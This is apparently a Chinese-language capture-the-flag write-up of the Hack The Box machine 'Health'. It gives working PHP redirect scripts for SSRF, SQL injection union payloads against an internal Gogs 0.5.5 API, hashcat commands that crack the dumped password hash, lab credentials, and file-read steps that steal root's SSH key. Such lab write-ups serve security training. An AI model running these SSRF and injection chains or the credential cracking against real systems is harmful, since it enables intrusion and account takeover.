nmap扫描结果

![](https://img.mi3aka.eu.org/2022/09/6dace0d8ed2c0c625d480ad1fb847f7b.png)

---

1. laravel框架debug开启

```
http://health.htb/webhook
http://health.htb/_ignition/execute-solution
```

![](https://img.mi3aka.eu.org/2022/09/350f9c2f87a6255155b87963acf98956.png)

但是尝试使用`laravel debug rce`失败

![](https://img.mi3aka.eu.org/2022/09/7c7efbb69c2e097bc172d302bfd048d3.png)

没有从debug页面得到有效信息

2. 本地起一个监听

![](https://img.mi3aka.eu.org/2022/09/906aded3a2938277d85d7b2f4bd29169.png)

![](https://img.mi3aka.eu.org/2022/09/b7274cfcb431401a3caf02424d150a2c.png)

![](https://img.mi3aka.eu.org/2022/09/817c9a85b02256e6b2f5e504daf4392c.png)

body字段返回对`payload.txt`的读取内容

发现靶机会进行存活探测(先进行get,后进行post),应该可以利用这一点进行内网探测

利用301重定向,成功读取进行`ssrf`

```php
<?php
Header("HTTP/1.1 301 Moved Permanently");
Header("Location: http://127.0.0.1");
```

![](https://img.mi3aka.eu.org/2022/09/987fcc7892574f4d4987296fe14cc015.png)

对3000端口进行探测

```
{
	"webhookUrl": "http:\/\/10.10.16.18",
	"monitoredUrl": "http:\/\/10.10.16.18:8074\/redirect.php",
	"health": "up",
	"body": "<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"_7HV_u2XouRVhbVKc_BRjTmaZzc6MTY2MjExNzM1NDQ3ODY0ODQzOQ==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"_7HV_u2XouRVhbVKc_BRjTmaZzc6MTY2MjExNzM1NDQ3ODY0ODQzOQ==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms<\/strong> \u00b7\n\t\t            Template: <strong>1ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>",
	"message": "HTTP\/1.1 301 Moved Permanently",
	"headers": {
		"Date": "Fri, 02 Sep 2022 11:15:54 GMT",
		"Server": "Apache\/2.4.51 (Debian)",
		"X-Powered-By": "PHP\/7.4.27",
		"X-Xdebug-Profile-Filename": "\/tmp\/cachegrind.out.36",
		"Location": "http:\/\/127.0.0.1:3000",
		"Content-Length": "0",
		"Connection": "close",
		"Content-Type": "text\/html; charset=UTF-8",
		"Set-Cookie": "_csrf=; Path=\/; Max-Age=0"
	}
}
```

```html
<!DOCTYPE html>
<html>
    <head data-suburl="">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="author" content="Gogs - Go Git Service" />
<meta name="description" content="Gogs(Go Git Service) a painless self-hosted Git Service written in Go" />
<meta name="keywords" content="go, git, self-hosted, gogs">
<meta name="_csrf" content="_7HV_u2XouRVhbVKc_BRjTmaZzc6MTY2MjExNzM1NDQ3ODY0ODQzOQ==" />


<link rel="shortcut icon" href="/img/favicon.png" />


<link rel="stylesheet" href="/maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">

<script src="/code.jquery.com/jquery-1.11.1.min.js"></script>


<link rel="stylesheet" href="/ng/css/ui.css">
<link rel="stylesheet" href="/ng/css/gogs.css">
<link rel="stylesheet" href="/ng/css/tipsy.css">
<link rel="stylesheet" href="/ng/css/magnific-popup.css">
<link rel="stylesheet" href="/ng/fonts/octicons.css">
<link rel="stylesheet" href="/css/github.min.css">


    <script src="/ng/js/lib/lib.js"></script>
    <script src="/ng/js/lib/jquery.tipsy.js"></script>
    <script src="/ng/js/lib/jquery.magnific-popup.min.js"></script>
        <script src="/ng/js/utils/tabs.js"></script>
        <script src="/ng/js/utils/preview.js"></script>
<script src="/ng/js/gogs.js"></script>

<title>Gogs: Go Git Service</title>
</head>
<body>
<div id="wrapper">
<noscript>Please enable JavaScript in your browser!</noscript>

<header id="header">
    <ul class="menu menu-line container" id="header-nav">
            <li class="right" id="header-nav-help">
                <a target="_blank" href="http:/gogs.io/docs"><i class="octicon octicon-info"></i>&nbsp;&nbsp;Help</a>
            </li>
            <li class="right" id="header-nav-explore">
                <a href="/explore"><i class="octicon octicon-globe"></i>&nbsp;&nbsp;Explore</a>
            </li>
    </ul>
</header>
<div id="promo-wrapper">
    <div class="container clear">
        <div id="promo-logo" class="left">
            <img src="/img/gogs-lg.png" alt="logo" />
        </div>
        <div id="promo-content">
            <h1>Gogs</h1>
            <h2>A painless self-hosted Git service written in Go</h2>
            <form id="promo-form" action="/user/login" method="post">
                <input type="hidden" name="_csrf" value="_7HV_u2XouRVhbVKc_BRjTmaZzc6MTY2MjExNzM1NDQ3ODY0ODQzOQ==">
                <input class="ipt ipt-large" id="username" name="uname" type="text" placeholder="Username or E-mail"/>
                <input class="ipt ipt-large" name="password" type="password" placeholder="Password"/>
                <input name="from" type="hidden" value="home">
                <button class="btn btn-black btn-large">Sign In</button>
                <button class="btn btn-green btn-large" id="register-button">Register</button>
            </form>
            <div id="promo-social" class="social-buttons">
                



            </div>
        </div>&nbsp;
    </div>
</div>
<div id="feature-wrapper">
    <div class="container clear">
        
        <div class="grid-1-2 left">
            <i class="octicon octicon-flame"></i>
            <b>Easy to install</b>
            <p>Simply <a target="_blank" href="http:/gogs.io/docs/installation/install_from_binary.html">run the binary</a> for your platform. Or ship Gogs with <a target="_blank" href="https:/github.com/gogits/gogs/tree/master/dockerfiles">Docker</a> or <a target="_blank" href="https:/github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs">Vagrant</a>, or get it <a target="_blank" href="http:/gogs.io/docs/installation/install_from_packages.html">packaged</a>.</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-device-desktop"></i>
            <b>Cross-platform</b>
            <p>Gogs runs anywhere <a target="_blank" href="http:/golang.org/">Go</a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-rocket"></i>
            <b>Lightweight</b>
            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!</p>
        </div>
        <div class="grid-1-2 left">
            <i class="octicon octicon-code"></i>
            <b>Open Source</b>
            <p>It's all on <a target="_blank" href="https:/github.com/gogits/gogs/">GitHub</a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!</p>
        </div>
        
    </div>
</div>
</div>
<footer id="footer">
    <div class="container clear">
        <p class="left" id="footer-rights">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms</strong> \u00b7
            Template: <strong>1ms</strong></p>

        <div class="right" id="footer-links">
            <a target="_blank" href="https:/github.com/gogits/gogs"><i class="fa fa-github-square"></i></a>
            <a target="_blank" href="https:/twitter.com/gogitservice"><i class="fa fa-twitter"></i></a>
            <a target="_blank" href="https:/plus.google.com/communities/115599856376145964459"><i class="fa fa-google-plus"></i></a>
            <a target="_blank" href="http:/weibo.com/gogschina"><i class="fa fa-weibo"></i></a>
            <div id="footer-lang" class="inline drop drop-top">Language
                <div class="drop-down">
                    <ul class="menu menu-vertical switching-list">
                    
                        <li><a href="#">English</a></li>
                        
                        <li><a href="/?lang=zh-CN">\u7b80\u4f53\u4e2d\u6587</a></li>
                        
                        <li><a href="/?lang=zh-HK">\u7e41\u9ad4\u4e2d\u6587</a></li>
                        
                        <li><a href="/?lang=de-DE">Deutsch</a></li>
                        
                        <li><a href="/?lang=fr-CA">Fran\u00e7ais</a></li>
                        
                        <li><a href="/?lang=nl-NL">Nederlands</a></li>
                        
                    </ul>
                </div>
            </div>
            <a target="_blank" href="http:/gogs.io">Website</a>
            <span class="version">Go1.3.2</span>
        </div>
    </div>
</footer>
</body>
</html>
```

探测得知为`Gogs: Go Git Service`版本为`0.5.5.1010 Beta`

exp参考

[https://www.exploit-db.com/exploits/35238](https://www.exploit-db.com/exploits/35238)

[https://www.mageni.net/vulnerability/gogs-055-0123-rce-vulnerability-113772](https://www.mageni.net/vulnerability/gogs-055-0123-rce-vulnerability-113772)

[https://packetstormsecurity.com/files/162123/Gogs-Git-Hooks-Remote-Code-Execution.html](https://packetstormsecurity.com/files/162123/Gogs-Git-Hooks-Remote-Code-Execution.html)

---

利用第一个exp,exp中提到在`models/repo.go`存在缺陷,从[https://github.com/gogs/gogs/archive/refs/tags/v0.5.5.zip](https://github.com/gogs/gogs/archive/refs/tags/v0.5.5.zip)下载源码分析

```go
func SearchRepositoryByName(opt SearchOption) (repos []*Repository, err error) {
	// Prevent SQL inject.
	opt.Keyword = strings.TrimSpace(opt.Keyword)
	if len(opt.Keyword) == 0 {
		return repos, nil
	}

	opt.Keyword = strings.Split(opt.Keyword, " ")[0]
	if len(opt.Keyword) == 0 {
		return repos, nil
	}
	opt.Keyword = strings.ToLower(opt.Keyword)

	repos = make([]*Repository, 0, opt.Limit)

	// Append conditions.
	sess := x.Limit(opt.Limit)
	if opt.Uid > 0 {
		sess.Where("owner_id=?", opt.Uid)
	}
	sess.And("lower_name like '%" + opt.Keyword + "%'").Find(&repos)
	return repos, err
}
```

`opt.Keyword`被直接拼接到查询语句中,在源代码中搜索`'%" + `,寻找是否存在类似的注入点

![](https://img.mi3aka.eu.org/2022/09/827088caa80174d957b2f31abb8e2c74.png)

发现在`models/user.go`存在类似的注入点

```go
func SearchUserByName(opt SearchOption) (us []*User, err error) {
	// Prevent SQL inject.
	opt.Keyword = strings.TrimSpace(opt.Keyword)
	if len(opt.Keyword) == 0 {
		return us, nil
	}

	opt.Keyword = strings.Split(opt.Keyword, " ")[0]
	if len(opt.Keyword) == 0 {
		return us, nil
	}
	opt.Keyword = strings.ToLower(opt.Keyword)

	us = make([]*User, 0, opt.Limit)
	err = x.Limit(opt.Limit).Where("type=0").And("lower_name like '%" + opt.Keyword + "%'").Find(&us)
	return us, err
}
```

>在第一个exp的后面提到了`models/user.go`,不过我只看了前面的`repo.go`...

利用`models/user.go`中的like注入,传入`')--`即可得到用户名和密码

```php
<?php
Header("HTTP/1.1 301 Moved Permanently");
Header("Location: http://127.0.0.1:3000/api/v1/users/search?q=')--");
```

![](https://img.mi3aka.eu.org/2022/09/a9ac977f0fd826eabf7bf21d99e5f3ae.png)

`{"username":"susanne","avatar":"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"}`

经过测试,得知一共回显了27列,第3列和第15列可以正常回显

```php
<?php
Header("HTTP/1.1 301 Moved Permanently");
Header("Location: http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--");
```

![](https://img.mi3aka.eu.org/2022/09/683db3a2787a8ebe147cc911dd6a9c8d.png)

`user`结果如下

```go
type User struct {
	Id            int64
	LowerName     string `xorm:"UNIQUE NOT NULL"`
	Name          string `xorm:"UNIQUE NOT NULL"`
	FullName      string
	Email         string `xorm:"UNIQUE NOT NULL"`
	Passwd        string `xorm:"NOT NULL"`
	LoginType     LoginType
	LoginSource   int64 `xorm:"NOT NULL DEFAULT 0"`
	LoginName     string
	Type          UserType
	Orgs          []*User       `xorm:"-"`
	Repos         []*Repository `xorm:"-"`
	NumFollowers  int
	NumFollowings int
	NumStars      int
	NumRepos      int
	Avatar        string `xorm:"VARCHAR(2048) NOT NULL"`
	AvatarEmail   string `xorm:"NOT NULL"`
	Location      string
	Website       string
	IsActive      bool
	IsAdmin       bool
	Rands         string    `xorm:"VARCHAR(10)"`
	Salt          string    `xorm:"VARCHAR(10)"`
	Created       time.Time `xorm:"CREATED"`
	Updated       time.Time `xorm:"UPDATED"`

	// For organization.
	Description string
	NumTeams    int
	NumMembers  int
	Teams       []*Team `xorm:"-"`
	Members     []*User `xorm:"-"`
}
```

![](https://img.mi3aka.eu.org/2022/09/22e8089c163e746b785e8d6aa05a7c4d.png)

![](https://img.mi3aka.eu.org/2022/09/cd5cb7a4f3d83eba5f34d6e8dab400d2.png)

![](https://img.mi3aka.eu.org/2022/09/9f3e35004b6cf2286c2b85f0c1acdff7.png)

密码为`66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37`,随机数种子为`m7483YfL9K`,盐为`sO3XIbeW14`

加密方式如下

```go
func (u *User) EncodePasswd() {
	newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
	u.Passwd = fmt.Sprintf("%x", newPasswd)
}
```

[PBKDF2 SHA256 hashcat解密](https://github.com/hashcat/hashcat/issues/1583)

`perl -e 'print pack ("H*", "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37")' | base64`

>hashfile中的内容

`sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=`

`hashcat -m 10900 --force hashfile rockyou.txt`

利用colab,成功爆破得到密码为`february15`

![](https://img.mi3aka.eu.org/2022/09/b0a5b9512b4b1201dea5c26149ff8d28.png)

成功使用`susanne:february15`登录ssh

![](https://img.mi3aka.eu.org/2022/09/19d1d99cc14222f73e32bb6a59827406.png)

---

测试了一下`gogs`那个rce没有成功

![](https://img.mi3aka.eu.org/2022/09/6a263609b9a8f35b5a6a7d23cba77517.png)

---

![](https://img.mi3aka.eu.org/2022/09/474c4e4302f84517169fae8d210a3637.png)

尝试了一下les提出的几个建议,都没有成功

`pspy`监控

```
2022/09/04 08:22:57 CMD: UID=111  PID=1446   | /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid 
2022/09/04 08:22:57 CMD: UID=0    PID=1303   | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2022/09/04 08:23:01 CMD: UID=0    PID=90623  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2022/09/04 08:23:06 CMD: UID=0    PID=90633  | mysql laravel --execute TRUNCATE tasks 
```

`/var/www/html/app/Http/Controllers/HealthChecker.php`

```php
<?php

namespace App\Http\Controllers;

class HealthChecker
{
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {
        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
	    $json['body'] = $res;
	    if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

            for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

                $split = explode(':', $http_response_header[$i], 2);

                if (count($split) == 2) {
                    $headers[trim($split[0])] = trim($split[1]);
                } else {
                    error_log("invalid header pair: $http_response_header[$i]\n");
                }

            }

	    $json['headers'] = $headers;
	    }

        } else {
            $json['health'] = "down";
        }

        $content = json_encode($json);

        // send
        $curl = curl_init($webhookUrl);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER,
            array("Content-type: application/json"));
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
        curl_exec($curl);
        curl_close($curl);

        return $json;

    }
}
```

`/var/www/html/.env`

```
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY=
APP_DEBUG=true
APP_URL=http://localhost

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DRIVER=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=null
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

![](https://img.mi3aka.eu.org/2022/09/1643d5f5875365491530e50f56bdcbd1.png)

通过修改`monitoredUrl`,达成任意文件读取

![](https://img.mi3aka.eu.org/2022/09/c9cd062255a75a498239d6772c25fe41.png)

---

![](https://img.mi3aka.eu.org/2022/09/7978372cbf41bd16fd5a8e172aa6d82f.png)

![](https://img.mi3aka.eu.org/2022/09/a2cfee909f2fad41f598f5c5bb7e54c2.png)

![](https://img.mi3aka.eu.org/2022/09/1827f0664106cf7eb7bb1b80c9c7764c.png)

成功读取`id_rsa`,并登录ssh

![](https://img.mi3aka.eu.org/2022/09/6e5a22b347c892873d3cd11fbbc5dadc.png)